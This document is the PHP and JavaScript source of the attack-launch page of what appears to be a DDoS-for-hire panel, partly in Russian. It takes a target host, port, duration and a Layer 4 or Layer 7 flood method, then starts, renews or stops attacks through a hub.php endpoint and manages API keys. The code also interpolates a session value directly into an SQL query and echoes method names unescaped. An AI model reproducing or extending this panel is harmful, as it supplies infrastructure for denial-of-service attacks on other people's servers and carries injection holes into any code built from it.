<?php

	/// Require the header that already contains the sidebar and top of the website and head body tags
	$page = "Хаб запуска атак";
	require_once 'header.php'; 
	
	/// Querys for the stats below
	$TotalPools = $odb->query("SELECT COUNT(*) FROM `api`")->fetchColumn(0);

	$testattacks = $odb->query("SELECT COUNT(*) FROM `logs` WHERE `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0")->fetchColumn(0);
	$load    = round($testattacks / $maxattacks * 100, 2);
?>


  <!-- Page Content -->
  <div id="page-wrapper">
    <div class="container-fluid">
      <div class="row bg-title">
        <div class="col-lg-3 col-md-4 col-sm-4 col-xs-12">
          <h4 class="page-title"><?php echo $page; ?> <i style="display: none;" id="alerts" class="fa fa-cog fa-spin"></i></h4>
        </div>
        <div class="col-lg-9 col-sm-8 col-md-8 col-xs-12">
          <ol class="breadcrumb">
            <li><a href="#"><?php echo $sitename; ?></a></li>
            <li class="active"><?php echo $page; ?></li>
          </ol>
        </div>
        <!-- /.col-lg-12 -->
      </div>
      <!-- .row -->

      <!--/.row -->
      <!-- .row -->
	   

	
	   <div class="col-lg-12" id="div"></div>
	     <div class="col-md-6 col-sm-12 col-xs-12">
		
          <div class="white-box">
		  <h3 class="m-b-0 box-title">Attack Hub <i style="display: none;" id="image" class="fa fa-cog fa-spin"></i></h3>
				<form class="form-horizontal"  method="post" onsubmit="return false;">
              <div class="form-group">
                <label for="inputEmail3" class="col-sm-3 control-label">Хост</label>
                <div class="col-sm-9">
                  <input class="form-control" type="text" id="host" name="host" placeholder="1.1.1.1 или http://link.com">
                </div>
              </div>
              <div class="form-group">
                <label for="inputEmail3" class="col-sm-3 control-label">Порт</label>
                <div class="col-sm-9">
                  <input class="form-control" type="text" id="port" name="port" placeholder="80">
                </div>
              </div>
              <div class="form-group">
                <label for="inputEmail3" class="col-sm-3 control-label">Время (в секундах)</label>
                <div class="col-sm-9">
                  <input class="form-control" type="text" id="time" name="time" placeholder="60">
                </div>
              </div>
              <div class="form-group">
                <label for="inputPassword3" class="col-sm-3 control-label">Метод</label>
                <div class="col-sm-9">
                  <select class="form-control" id="method" name="method">
														<optgroup label="Layer 4 Methods">
														<?php
														$SQLGetLogs = $odb->query("SELECT * FROM `methods` WHERE `type` = 'layer4' ORDER BY `id` ASC");
														while ($getInfo = $SQLGetLogs->fetch(PDO::FETCH_ASSOC)) {
															$name = $getInfo['name'];
															$fullname = $getInfo['fullname'];
															echo '<option value="' . htmlentities($name) . '">' . htmlentities($fullname) . '</option>';
														}
														?>
														</optgroup>
														<optgroup label="Layer 7 Methods">
														<?php
															$SQLGetLogs = $odb->query("SELECT * FROM `methods` WHERE `type` = 'layer7' ORDER BY `id` ASC");
															while ($getInfo = $SQLGetLogs->fetch(PDO::FETCH_ASSOC)) {
																$name     = $getInfo['name'];
																$fullname = $getInfo['fullname'];
																echo '<option value="' . $name . '">' . $fullname . '</option>';
															}
														?>
														</optgroup>
													</select>
                </div>
              </div>    
                  

                  
              <div class="form-group m-b-0">
                <div class="col-sm-offset-3 col-sm-9">
                  <button class="btn btn-success" onclick="start()" type="submit">
													<i class="fa fa-plus push-5-r"></i> Запустить
												</button>
												<?php 
												// Check if user has an API with us.
												$userID = $_SESSION['ID'];
												
													$SQL = $odb -> prepare("SELECT COUNT(userID) FROM `users_api` WHERE `userID` = :userID");
													$SQL -> execute(array(':userID' => $userID));
													$status = $SQL -> fetchColumn(0);
													if ($status == 1){
													
														echo '
												<button class="btn btn-outline btn-warning" data-toggle="modal" data-target="#manageapi" type="button"><i class="fa fa-wrench"></i> Manage API</button>';
													
													}
												?>
                </div>
              </div>
            </form>
          </div>
        </div>
		 <div class="col-md-6 col-sm-12 col-xs-12">
          <div class="white-box">
		  <h3 class="m-b-0 box-title">Manage Attacks <i style="display: none;" id="manage" class="fa fa-cog fa-spin"></i></h3>
            <div id="attacksdiv" style="display:inline-block;width:100%"></div>
          </div>
        </div>
      </div>
	  <?php 
	  // Checks if there session for the latest attack sent
	  
	  if(!empty($_SESSION['ping_key']))
	  {
	  /// GRAB PING INFO
	   $SQLSelect = $odb->query("SELECT * FROM `ping_sessions` WHERE ping_key='{$_SESSION['ping_key']}' ORDER BY `ID` DESC LIMIT 1");
		while ($show = $SQLSelect->fetch(PDO::FETCH_ASSOC)) {
			
		$userid = $show['user_id'];
		$key = $show['ping_key'];
        $pingip = $show['ping_ip'];
        $pingport = $show['ping_port'];
	  ?>
	  <!-- Modal -->
		<div class="modal fade" id="pingModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
		  <div class="modal-dialog" role="document">
			<div class="modal-content">
			  <div class="modal-header">
				<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
				<h4 class="modal-title" id="myModalLabel">Pinging - <?php echo $pingip; ?></h4>
			  </div>
			  <div class="modal-body">
			  <div class="modal-footer">
				<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
			  </div>
			</div>
		  </div>
		</div>
	  <?php
	  // End of Pinger Module
		}
	  }
	  ?>
      <!--/.row -->
	  <script>
		attacks();
		alerts();
		
		function attacks() {
			document.getElementById("attacksdiv").style.display = "none";
			document.getElementById("manage").style.display = "inline"; 
			var xmlhttp;
			if (window.XMLHttpRequest) {
				xmlhttp = new XMLHttpRequest();
			}
			else {
				xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
			}
			xmlhttp.onreadystatechange=function() {
				if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
					document.getElementById("attacksdiv").innerHTML = xmlhttp.responseText;
					document.getElementById("manage").style.display = "none";
					document.getElementById("attacksdiv").style.display = "inline-block";
					document.getElementById("attacksdiv").style.width = "100%";
					eval(document.getElementById("ajax").innerHTML);
				}
			}
			xmlhttp.open("GET","includes/ajax/user/attacks/attacks.php",true);
			xmlhttp.send();
		
		}
		function alerts() {
			document.getElementById("alertsdiv").style.display = "none";
			document.getElementById("alerts").style.display = "inline"; 
			var xmlhttp;
			if (window.XMLHttpRequest) {
				xmlhttp = new XMLHttpRequest();
			}
			else {
				xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
			}
			xmlhttp.onreadystatechange=function() {
				if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
					document.getElementById("alertsdiv").innerHTML = xmlhttp.responseText;
					document.getElementById("alerts").style.display = "none";
					document.getElementById("alertsdiv").style.display = "inline-block";
					document.getElementById("alertsdiv").style.width = "100%";
					eval(document.getElementById("ajax").innerHTML);
				}
			}
			xmlhttp.open("GET","includes/ajax/user/alerts.php",true);
			xmlhttp.send();
		}
		
		
		
			
		function start() {
			var host=$('#host').val();
			var port=$('#port').val();
			var time=$('#time').val();
			var method=$('#method').val();
			var vip=$('0').val();
			document.getElementById("image").style.display="inline"; 
			document.getElementById("div").style.display="none"; 
			var xmlhttp;
			if (window.XMLHttpRequest) {
				xmlhttp=new XMLHttpRequest();
			}
			else {
				xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
			}
			xmlhttp.onreadystatechange=function() {
				if (xmlhttp.readyState==4 && xmlhttp.status==200) {
					document.getElementById("div").innerHTML=xmlhttp.responseText;
					document.getElementById("div").style.display="inline";
					document.getElementById("image").style.display="none";
					if (xmlhttp.responseText.search("success") != -1) {
						attacks();
						window.setInterval(ping(host),10000);
					}
				}
			}
			xmlhttp.open("GET","includes/ajax/user/attacks/hub.php?type=start" + "&host=" + host + "&port=" + port + "&time=" + time + "&method=" + method + "&vip=" + vip,true);
			xmlhttp.send();					
		}
		
		function renew(id) {
			document.getElementById("manage").style.display="inline"; 
			document.getElementById("div").style.display="none"; 
			var xmlhttp;
			if (window.XMLHttpRequest) {
				xmlhttp=new XMLHttpRequest();
			}
			else {
				xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
			}
			xmlhttp.onreadystatechange=function() {
				if (xmlhttp.readyState==4 && xmlhttp.status==200) {
					document.getElementById("div").innerHTML=xmlhttp.responseText;
					document.getElementById("div").style.display="inline";
					document.getElementById("manage").style.display="none";
					if (xmlhttp.responseText.search("success") != -1) {
						attacks();
						window.setInterval(ping(host),10000);
					}
				}
			}
			xmlhttp.open("GET","includes/ajax/user/attacks/hub.php?type=renew&id=" + id,true);
			xmlhttp.send();
			$('#pingModal').modal('show'); 
		}
		
		function stop(id) {
			document.getElementById("manage").style.display="inline"; 
			document.getElementById("div").style.display="none"; 
			var xmlhttp;
			if (window.XMLHttpRequest) {
				xmlhttp=new XMLHttpRequest();
			}
			else {
				xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
			}
			xmlhttp.onreadystatechange=function() {
				if (xmlhttp.readyState==4 && xmlhttp.status==200) {
					document.getElementById("div").innerHTML=xmlhttp.responseText;
					document.getElementById("div").style.display="inline";
					document.getElementById("manage").style.display="none";
					if (xmlhttp.responseText.search("success") != -1) {
						attacks();
						window.setInterval(ping(host),10000);
					}
				}
			}
			xmlhttp.open("GET","includes/ajax/user/attacks/hub.php?type=stop" + "&id=" + id,true);
			xmlhttp.send();
		}
		
		
		</script>
		<div class="modal " id="manageapi" tabindex="-1" role="dialog" aria-hidden="false" style="display: non;">
				<div class="modal-dialog modal-lg" role="document">
									<div class="modal-content ">
									  <div class="modal-header">
										<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
										<h4 class="modal-title" id="exampleModalLabel1">Manage API  <i style="display: none;" id="icon" class="fa fa-cog fa-spin"></i></h4>
									  </div>
									  <div class="modal-body">
									  <div id="div"></div>
											<?php /// HERE NEEDS TO BE TERMS OF SERVICE FROM ADMIN PANEL! ?>
											<form class="form-horizontal" method="post" onsubmit="return false;">
											<ul class="list-icons">
											
								
											</ul>
											</form>
									  </div>
									  <div class="modal-footer">
										<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
										<button onclick="newticket()" class="btn btn-outline btn-info"><i class="fa fa-plus"></i> Regenerate Key</button>
									  </div>
									</div>
								  </div>
			</div>
<?php

	require_once 'footer.php';
	
?>